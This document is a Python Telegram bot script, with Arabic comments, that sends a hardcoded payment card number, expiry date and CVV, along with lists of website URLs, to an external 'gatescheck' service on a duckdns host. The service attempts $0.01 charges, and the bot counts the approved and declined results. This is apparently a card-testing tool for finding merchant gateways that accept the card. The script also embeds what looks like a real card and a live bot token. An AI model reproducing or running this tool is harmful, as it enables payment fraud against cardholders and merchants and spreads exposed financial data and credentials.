import os
import asyncio
import httpx
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ========= CONFIG =========

API_URL = "http://gatescheck.duckdns.org:7000/check"
CARD = "5108750403664279|02|2028|402"

# ELPERS =========

def clean_url(url: str):
    url = url.strip()
    if not url:
        return None
    if not url.startswith("http"):
        url = "http://" + url
    return url

# ========= API CHECK =========

async def check_url_async(client, url):
    url = clean_url(url)
    if not url:
        return "❌ Empty"

    try:
        params = {
            "url": url,
            "card": CARD,
            "amount": 0.01
        }

        # retry بسيط
        for _ in range(2):
            try:
                r = await client.get(API_URL, params=params, timeout=12)
                data = r.json()
                result = data.get("result", "Unknown")
                return f"{url} ➜ {result}"
            except:
                continue

        return f"{url} ➜ API Error"

    except:
        return f"{url} ➜ Connection Error"

# ========= FILE READER =========

def read_links_file(filename):
    links = []
    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            url = clean_url(line)
            if url:
                links.append(url)
    return links

# ========= COMMAND =========

async def site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /site example.com")
        return

    url = " ".join(context.args)
    await update.message.reply_text("🔍 Checking...")

    async with httpx.AsyncClient() as client:
        result = await check_url_async(client, url)

    await update.message.reply_text(result)

# ========= FILE HANDLER =========

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document: Document = update.message.document

    if not document.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please upload .txt file")
        return

    await update.message.reply_text("📥 Processing file...")

    file = await document.get_file()
    file_path = "links.txt"
    await file.download_to_drive(file_path)

    links = read_links_file(file_path)

    total = len(links)
    approved = 0
    declined = 0
    unknown = 0

    async with httpx.AsyncClient(follow_redirects=True) as client:
        for url in links:
            result = await check_url_async(client, url)

            # ===== تحليل النتائج =====
            if "Charged" in result or "Approved" in result:
                approved += 1
            elif "Declined" in result:
                declined += 1
            else:
                unknown += 1

            # ===== إرسال النتيجة لكل رابط + delay 3 ثواني =====
            await update.message.reply_text(result)
            await asyncio.sleep(3)  # 🐢 delay 3 ثواني لكل رابط

    stats = (
        f"\n📊 RESULTS SUMMARY\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📦 Total: {total}\n"
        f"✅ Approved: {approved}\n"
        f"❌ Declined: {declined}\n"
        f"⚠️ Others: {unknown}"
    )

    await update.message.reply_text(stats)

    os.remove(file_path)

# ========= RUN =========

if __name__ == "__main__":
    app = ApplicationBuilder().token("7707742168:AAGYX7yJBHjm-aVECNFHJ8n68YMPRThD76w").build()

    app.add_handler(CommandHandler("site", site_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    print("Bot Started...")
    app.run_polling()
